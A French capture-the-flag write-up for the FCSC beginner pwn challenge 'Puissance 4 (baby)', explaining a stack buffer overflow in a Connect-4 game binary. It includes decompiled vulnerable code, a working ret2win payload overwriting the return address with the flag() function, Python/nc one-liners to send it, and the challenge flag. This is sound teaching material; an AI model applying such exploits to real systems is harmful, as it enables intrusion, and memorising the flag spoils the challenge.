---
title: Puissance 4 (baby)
tags:
  - pwn 
  - intro
  - CTF
  - 🇫🇷
---

- Author: Cryptanalyse

## Description

Pourrez-vous gagner au puissance 4 contre une IA débile ? Et si oui, vous pouvez ensuite tenter de lire le fichier flag.txt situé sur le serveur.

## Solution

### Quick overview

On a un binaire, qui est un programme de puissance 4 au tour par tour avec un bot, facile de gagner mais moins de pwn le binaire.

Niveau sécurités il n'y a ni stack canary, ni PIE ce qui va nous faciliter la vie.

```c
$ checksec puissance4-baby                        
[*] './puissance4-baby'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Voici la boucle de jeu du programme:
1. Affiche l’état de la grille de puissance 4
2. Attend une entree utilisateur comme coup du joueur

```
Welcome to FCSC 4!
.......
.......
.......
.......
.......
.......
Your move [0 - 6]: 
```

3. Joue en retour le coup du bot
4. Puis redémarre la boucle (affichage grille, entrée utilisateur, ...)



### Decompilation

En décompilant via ghidra l'exécutable, on remarque rapidement une fonction `flag()` qui lit le fichier flag.txt. Notre objectif sera donc de détourner le flux d'execution vers cette fonction.

On s’intéresse aussi à la fonction qui gère le coup du joueur, `player_turn()` et en regardant le pseudo-C de ghidra, on découvre une faille buffer overflow :

```c
void player_turn(void)
{
  ulong uVar1;
  char local_10 [8];
  
  printf("Your move [0 - %d]: ",6);
  fgets(local_10,0x40,stdin);       // buffer overflow : sauvegarde 64 bytes dans un buffer de 8.
  uVar1 = strtol(local_10,(char **)0x0,10);
  drop(uVar1 & 0xffffffff,0x58);
  return;
}
```

On a donc notre quoi ? (fonction `flag()`) et notre comment ? (buffer overflow dans `player_turn()`). Il ne reste plus qu'à construire le payload d'exploitation.

### It's PWN time

L’état de la stack de `player_turn` n'est pas bien complexe : on a un `push RBX` au début puis notre buffer de 8 octets. Soit 16 octets au total pour atteindre l’adresse de retour de la fonction qui sera appelée au moment du `return` et qu'on veut écraser avec celle de `flag()`.

On récupère l'adresse de `flag()` (ca tombe bien elle est fixe puisque le binaire n'est pas un PIE) : `0x4011d6`
et on peut enfin construire notre payload final:

```
<-buffer->    <-saved RBX->    <-@flag->
"AAAAAAAA"  +   "AAAAAAAA"   + 0x4011d6

-> AAAAAAAAAAAAAAAA\xd6\x11\x40\x00\x00\x00\x00\x00
```

Plus qu'à tester en local (en créant un fichier flag.txt) :

```sh
python3 -c 'import sys; import time; time.sleep(0.5); sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAA\xd6\x11\x40\x00\x00\x00\x00\x00")' | ./puissance4-baby
```

Et pour valider sur le serveur :

```sh
# dummy ip
python3 -c 'import sys; import time; time.sleep(0.5); sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAA\xd6\x11\x40\x00\x00\x00\x00\x00\n")' | nc 127.0.0.1 8000
```

## Flag

<details> 
<summary>Spoiler</summary>

```
FCSC{77adfc95029e73b173f60e556f915b0cd8850848111358b1c370fb7c154e61fd}
```

</details>






